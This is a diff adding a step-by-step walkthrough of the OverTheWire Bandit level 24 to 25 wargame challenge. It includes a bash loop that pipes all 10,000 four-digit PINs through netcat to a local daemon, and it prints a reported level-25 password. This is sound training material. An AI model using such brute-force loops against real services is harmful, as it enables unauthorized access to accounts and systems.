@@ -1,0 +1,75 @@
+// Bandit Level 24 → Level 25
+
+URL: https://overthewire.org/wargames/bandit/
+
+Step1: Log in to the Bandit Level 24 server:
+
+        ssh bandit24@bandit.labs.overthewire.org -p 2220
+
+Step2: Enter the password obtained from Bandit Level 23.
+
+Step3: The challenge tells us that a daemon is listening on port `30002`.
+
+Step4: The daemon requires two things:
+
+        Bandit Level 24 password
+        +
+        4-digit PIN
+
+Step5: We do not know the PIN. There are 10,000 possible combinations:
+
+        0000 → 9999
+
+Step6: We can use `nc` to connect to the service:
+
+        nc localhost 30002
+
+Step7: The format expected by the server is:
+
+        <bandit24_password> <4-digit-pin>
+
+Step8: Instead of trying all 10,000 combinations manually, we can generate them using a loop.
+
+Step9: Run:
+
+        for i in $(seq -w 0000 9999); do
+            echo "YOUR_BANDIT24_PASSWORD $i"
+        done | nc localhost 30002
+
+Step10: Replace `YOUR_BANDIT24_PASSWORD` with the actual Bandit Level 24 password.
+
+Step11: A cleaner one-line version is:
+
+        for i in $(seq -w 0000 9999); do echo "YOUR_BANDIT24_PASSWORD $i"; done | nc localhost 30002
+
+Step12: The command generates:
+
+        password 0000
+        password 0001
+        password 0002
+        ...
+        password 9999
+
+Step13: These are sent to port `30002` through one Netcat connection.
+
+Step14: Most responses will say:
+
+        Wrong!
+
+Step15: When the correct PIN is reached, the server returns:
+
+        Correct!
+
+        followed by the password for Bandit Level 25.
+
+Step16: One recent writeup reports the Bandit Level 25 password as:
+
+        iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
+Step17: Another recent writeup reports a different current password, which shows that Bandit passwords can change.
+
+Step18: Therefore, use the password printed by your own live Bandit server rather than relying on an old online password.
+
+Step19: The Bandit Level 24 → Level 25 challenge is solved.
+
+Step20: Congratulations!! you have solved this problem!!
